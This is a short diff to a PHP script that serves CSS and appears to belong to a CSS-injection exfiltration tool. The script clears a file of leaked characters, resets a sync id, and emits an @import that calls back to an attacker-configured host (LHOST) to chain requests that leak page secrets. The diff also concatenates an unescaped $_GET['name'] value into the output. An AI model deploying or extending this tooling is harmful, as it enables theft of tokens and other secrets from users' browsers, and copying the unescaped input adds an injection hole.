@@ -1,6 +1,6 @@
 <?php 
     header("Content-Type: text/css"); 
-    require('config.php');
+    require_once('config.php');
     
     // Clean leak chars file
     $preCharsFile = 'pre.txt';
@@ -26,6 +26,6 @@
     file_put_contents($syncIdFile, md5(openssl_random_pseudo_bytes(20)));
 
     echo '
-        @import url(' . $host . 'next.php?len=0);
+        @import url(' . LHOST . LURL_NEXT . '?len=0&name=' . $_GET['name'] . ');
     ';
 ?>  
